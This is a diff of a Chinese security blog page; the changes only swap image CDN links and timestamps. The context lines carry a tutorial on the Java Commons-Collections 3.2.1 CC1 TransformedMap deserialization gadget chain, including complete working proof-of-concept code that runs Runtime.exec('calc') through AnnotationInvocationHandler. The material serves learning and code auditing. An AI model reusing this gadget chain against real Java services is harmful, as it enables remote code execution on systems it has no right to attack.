@@ -51,7 +51,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wr0ld.github.io/avatar.png">
 <meta property="article:published_time" content="2026-03-31T02:00:00.000Z">
-<meta property="article:modified_time" content="2026-05-14T10:04:40.414Z">
+<meta property="article:modified_time" content="2026-05-14T13:37:55.999Z">
 <meta property="article:author" content="wr0ld">
 <meta property="article:tag" content="代码审计">
 <meta property="article:tag" content="Java">
@@ -67,7 +67,7 @@
   <!-- feed -->
   
 
-  <link rel="stylesheet" href="/css/main.css?v=mp5bt8lr">
+  <link rel="stylesheet" href="/css/main.css?v=mp5jbj9f">
 
 
   
@@ -76,7 +76,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-03-31T10:00:00+08:00","dateModified":"2026-05-14T18:04:40+08:00","datePublished":"2026-03-31T10:00:00+08:00","description":"","headline":"代码审计 | CC1 TransformedMap 链 ——前言  反向调试 构造Payload","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/becfd9ce/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/becfd9ce/","keywords":"代码审计, Java, 反序列化, Java反序列化","thumbnailUrl":"https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image7.png","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-03-31T10:00:00+08:00","dateModified":"2026-05-14T21:37:55+08:00","datePublished":"2026-03-31T10:00:00+08:00","description":"","headline":"代码审计 | CC1 TransformedMap 链 ——前言  反向调试 构造Payload","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/becfd9ce/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/becfd9ce/","keywords":"代码审计, Java, 反序列化, Java反序列化","thumbnailUrl":"https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/%E5%89%8D%E8%A8%80_image7.png","image":1}</script>
   
 </head>
 <body><div class="reading-progress-bar"></div>
@@ -163,7 +163,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cc1</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException,</span><br><span class="line">            ClassNotFoundException, NoSuchMethodException,</span><br><span class="line">            InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        Runtime.class.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(Runtime.getRuntime(), <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建恶意对象</span></span><br><span class="line">        <span class="type">cc1</span> <span class="variable">evil</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">cc1</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(evil);</span><br><span class="line">        <span class="type">byte</span>[] payload = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化（触发恶意代码）</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload));</span><br><span class="line">        ois.readObject(); <span class="comment">// ← calc 应该会打开</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>是可以成功的。</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image1.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/%E5%89%8D%E8%A8%80_image1.png"></p>
 <hr>
 <h2 id="但实际场景中没地方写代码怎么办"><a href="#但实际场景中没地方写代码怎么办" class="headerlink" title="但实际场景中没地方写代码怎么办"></a>但实际场景中没地方写代码怎么办</h2><p>问题来了——如果是一个 Web 应用，根本没地方写代码，没有执行的地方，不可能直接开一个 <code>readObject</code> 的入口给我们写代码。</p>
 <p>这就需要借助反序列化入口的服务，比如 <strong>JNDI 注入（RMI &#x2F; LDAP）</strong>。</p>
@@ -194,11 +194,11 @@
 </ul>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image2.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/%E5%89%8D%E8%A8%80_image2.png"></p>
 <hr>
 <h3 id="第一步：找到能执行命令的点-——-InvokerTransformer"><a href="#第一步：找到能执行命令的点-——-InvokerTransformer" class="headerlink" title="第一步：找到能执行命令的点 —— InvokerTransformer"></a>第一步：找到能执行命令的点 —— InvokerTransformer</h3><p>首先需要找到一个可以利用反射调用执行的代码。</p>
 <p><code>InvokerTransformer.transform()</code> 可以，它本质就是<strong>反射调用任意方法</strong>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image3.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/%E5%89%8D%E8%A8%80_image3.png"></p>
 <p>把它配置成：</p>
 <ul>
 <li><code>input</code> &#x3D; Runtime 实例</li>
@@ -207,11 +207,11 @@
 </ul>
 <p>就等于执行了 <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>。</p>
 <p>并且这些参数都是<strong>可控的</strong>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image4.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/%E5%89%8D%E8%A8%80_image4.png"></p>
 <p>因此现在可以构造：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// 构造 Transformer</span></span><br><span class="line">    <span class="type">InvokerTransformer</span> <span class="variable">invoker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    invoker.transform(Runtime.getRuntime());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/%E5%89%8D%E8%A8%80_image5.png"></p>
 <p>成功执行。</p>
 <hr>
 <h3 id="第二步：Runtime-不能序列化怎么办"><a href="#第二步：Runtime-不能序列化怎么办" class="headerlink" title="第二步：Runtime 不能序列化怎么办"></a>第二步：Runtime 不能序列化怎么办</h3><p>这里有两个问题：</p>
@@ -221,7 +221,7 @@
 <p>因为 <strong><code>Runtime</code> 不能序列化</strong>，直接放进去序列化会报错。所以只能序列化 <code>Runtime.class</code>（Class 对象可以序列化），然后通过反射在运行时再拿到实例。</p>
 <hr>
 <h3 id="第三步：谁来串联调用-——-ChainedTransformer"><a href="#第三步：谁来串联调用-——-ChainedTransformer" class="headerlink" title="第三步：谁来串联调用 —— ChainedTransformer"></a>第三步：谁来串联调用 —— ChainedTransformer</h3><p>回答问题二：谁来调用 <code>InvokerTransformer.transform(Runtime实例)</code>？</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image6.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/%E5%89%8D%E8%A8%80_image6.png"></p>
 <p>**<code>ChainedTransformer.transform()</code>**——它把每个 <code>Transformer</code> 串起来，上一个的输出自动传给下一个。这刚好弥补了需要多次调用 <code>InvokerTransformer.transform()</code> 才能实现完整反序列化链的问题。</p>
 <p>调用顺序如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ConstantTransformer(Runtime.class)         → 输出 Runtime.class</span><br><span class="line">InvokerTransformer(&quot;getMethod&quot;, &quot;getRuntime&quot;) → 输出 getRuntime 这个 Method 对象</span><br><span class="line">InvokerTransformer(&quot;invoke&quot;, null)         → 调用 getRuntime() → 输出 Runtime 实例</span><br><span class="line">InvokerTransformer(&quot;exec&quot;)                 → 执行 exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure>
@@ -230,26 +230,26 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),          <span class="comment">// 1. 输出 Runtime.class</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,              <span class="comment">// 2. 拿到 getRuntime 方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,                 <span class="comment">// 3. 调用 getRuntime() 拿到实例</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,                   <span class="comment">// 4. 执行 exec(&quot;calc&quot;)</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">chain.transform(<span class="literal">null</span>); <span class="comment">// 入参是 null，因为第一步 ConstantTransformer 会忽略输入</span></span><br></pre></td></tr></table></figure>
 
 <p>效果：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image7.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/%E5%89%8D%E8%A8%80_image7.png"></p>
 <hr>
 <h3 id="第四步：谁来触发-transform-——-TransformedMap"><a href="#第四步：谁来触发-transform-——-TransformedMap" class="headerlink" title="第四步：谁来触发 transform() —— TransformedMap"></a>第四步：谁来触发 transform() —— TransformedMap</h3><p>现在问题变成：<strong>谁会调用 <code>chain.transform()</code>？</strong></p>
 <p>**<code>TransformedMap</code>**——当 Map 的值被修改时，会自动调用 <code>valueTransformer.transform()</code>。不过它是 protected 类型，不能直接使用，需要找到调用这个方法的入口。</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image8.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/%E5%89%8D%E8%A8%80_image8.png"></p>
 <p>另外还有一个要求：<code>valueTransformer</code> 是<strong>可控的</strong>，可控的话只要传入 <code>chain</code> 就行。</p>
 <p>查找可以传入可控 <code>valueTransformer</code> 的方法：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image9.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/%E5%89%8D%E8%A8%80_image9.png"></p>
 <p>不过这个也是 protected，不能直接调用，需要找公共的入口方法。</p>
 <ul>
 <li><strong>第一步</strong>：找公开调用 <code>checkSetValue</code> 的方法——用 Alt+F7 或右键查找用法，找到 <code>setValue</code>：</li>
 </ul>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image10.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/%E5%89%8D%E8%A8%80_image10.png"></p>
 <ul>
 <li><strong>第二步</strong>：找公开调用 <code>TransformedMap</code> 的方法，找到两个，使用第一个（第二个会使链断掉）：</li>
 </ul>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image11.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/%E5%89%8D%E8%A8%80_image11.png"></p>
 <p>使用 <code>TransformedMap.decorate(map, null, chain)</code> 就能正常传入我们的链条了：</p>
 <p>运行时提示</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image12.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/%E5%89%8D%E8%A8%80_image12.png"></p>
 <p><code>map</code> 值不能为空，构造一个：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, chain);</span><br></pre></td></tr></table></figure>
 
@@ -257,12 +257,12 @@
 <p>注意：<code>key</code> 和 <code>value</code> 填什么都行——因为 <code>ConstantTransformer</code> 第一步就把输入忽略了。不过后面 <code>AnnotationInvocationHandler</code> 里有条件判断，<code>key</code> 必须填 <code>&quot;value&quot;</code>，后面会讲到。</p>
 </blockquote>
 <p>还差最开始的触发方法，它在两个类的下面：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image13.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/%E5%89%8D%E8%A8%80_image13.png"></p>
 <hr>
 <h3 id="第五步：找到自动调用-setValue-的地方-——-AnnotationInvocationHandler"><a href="#第五步：找到自动调用-setValue-的地方-——-AnnotationInvocationHandler" class="headerlink" title="第五步：找到自动调用 setValue 的地方 —— AnnotationInvocationHandler"></a>第五步：找到自动调用 setValue 的地方 —— AnnotationInvocationHandler</h3><p>右键查找谁调用了 <code>setValue</code>，结果有很多：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image14.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/%E5%89%8D%E8%A8%80_image14.png"></p>
 <p>最终找到的是 <code>AnnotationInvocationHandler.class</code> 里的 <code>readObject</code> 方法——这就是我们想要的终点，<code>readObject</code> 会被反序列化自动调用，<code>setValue</code> 在其 <code>for</code> 循环里：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image15.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/%E5%89%8D%E8%A8%80_image15.png"></p>
 <p>但是有判断条件需要满足：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 条件一：用 key 去注解里查有没有这个方法</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line"><span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123; <span class="comment">// 查不到就跳过，setValue 永远不执行</span></span><br></pre></td></tr></table></figure>
 
@@ -272,15 +272,15 @@
 <p><code>var7</code> 是注解方法的返回类型（<code>ElementType[]</code>），<code>var8</code> 是我们 map 里的值。只有类型不匹配，才会进 if 块调 <code>setValue()</code>。我们放字符串 <code>&quot;xxx&quot;</code>，显然不是 <code>ElementType[]</code>，条件满足。</p>
 <hr>
 <h3 id="第六步：构造-AnnotationInvocationHandler"><a href="#第六步：构造-AnnotationInvocationHandler" class="headerlink" title="第六步：构造 AnnotationInvocationHandler"></a>第六步：构造 AnnotationInvocationHandler</h3><p>先找到 <code>AnnotationInvocationHandler</code> 的构造方法，看它需要什么参数：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image17.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image18.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/%E5%89%8D%E8%A8%80_image17.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/%E5%89%8D%E8%A8%80_image18.png"></p>
 <p>两个参数：</p>
 <ul>
 <li><code>var1</code>：<code>Class&lt;? extends Annotation&gt;</code>，必须是一个<strong>注解类</strong></li>
 <li><code>var2</code>：<code>Map&lt;String, Object&gt;</code>，就是我们的 <code>transformedMap</code></li>
 </ul>
 <p>但是这个类<strong>不能直接引用</strong>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image19.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/%E5%89%8D%E8%A8%80_image19.png"></p>
 <p>所以利用反射调用这个类：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br></pre></td></tr></table></figure>
 
@@ -292,7 +292,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;Set&gt; <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException,</span><br><span class="line">            NoSuchMethodException, InvocationTargetException,</span><br><span class="line">            InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),          <span class="comment">// 1. 输出 Runtime.class</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,              <span class="comment">// 2. 拿到 getRuntime 方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,                 <span class="comment">// 3. 调用 getRuntime() 拿到实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,                   <span class="comment">// 4. 执行 exec(&quot;calc&quot;)</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, chain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        <span class="type">byte</span>[] payload = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化（触发链）</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>效果：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/%E5%89%8D%E8%A8%80_image20.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/%E5%89%8D%E8%A8%80_image20.png"></p>
 <hr>
 <h2 id="完整调用链总结"><a href="#完整调用链总结" class="headerlink" title="完整调用链总结"></a>完整调用链总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">反序列化</span><br><span class="line">  └─ AnnotationInvocationHandler.readObject()   ← 自动触发</span><br><span class="line">       └─ Map.Entry.setValue()</span><br><span class="line">            └─ TransformedMap.checkSetValue()</span><br><span class="line">                 └─ ChainedTransformer.transform()</span><br><span class="line">                      ├─ ConstantTransformer       → Runtime.class</span><br><span class="line">                      ├─ InvokerTransformer        → getMethod(&quot;getRuntime&quot;)</span><br><span class="line">                      ├─ InvokerTransformer        → invoke() → Runtime 实例</span><br><span class="line">                      └─ InvokerTransformer        → exec(&quot;calc&quot;)  🎯</span><br></pre></td></tr></table></figure>
 
@@ -748,7 +748,7 @@
 </script>
 
 <!-- required -->
-<script src="/js/main.js?v=mp5bt8lt" defer></script>
+<script src="/js/main.js?v=mp5jbj9i" defer></script>
 
 <script type="text/javascript">
